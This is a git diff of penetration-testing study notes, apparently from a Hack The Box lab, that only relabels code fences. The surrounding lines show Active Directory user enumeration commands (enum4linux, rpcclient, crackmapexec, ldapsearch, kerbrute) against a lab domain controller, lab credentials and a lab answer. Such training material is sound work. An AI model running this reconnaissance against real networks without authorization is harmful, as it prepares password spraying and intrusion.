@@ -10,7 +10,7 @@ There are several ways that we can gather a target list of valid users:
 ## SMB NULL Session to Pull User List
 ### Using enum4linux
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 administrator
@@ -35,7 +35,7 @@ mholliday
 
 ### Using rpcclient
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
 
 rpcclient $> enumdomusers 
@@ -53,7 +53,7 @@ user:[avazquez] rid:[0x458]
 - `badpwdcount`: invalid login attempts, so we can remove any accounts from our list that are close to the lockout threshold
 - `badpwdtime`: date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -72,7 +72,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez
 ### Using ldapsearch
 If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 
 guest
@@ -95,7 +95,7 @@ dbranch
 ### Using windapsearch
 Tools such as `windapsearch` make this easier. Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
 [+] No username provided. Will try anonymous bind.
@@ -136,7 +136,7 @@ This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?
 
 ### Kerbrute User Enumeration
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
     __             __               __     
@@ -170,7 +170,7 @@ With valid credentials, we can use any of the tools stated previously to build a
 
 ### Using CrackMapExec with Valid Credentials
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 
 [sudo] password for htb-student: 
@@ -192,7 +192,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon 
 SSH to **10.129.16.99 (ACADEMY-EA-ATTACK01)**, with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint? **Answer: 56**
    - Run Kerbrute with the specified user list:
-        ```sh
+        ```shellsession
         $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
             __             __               __     
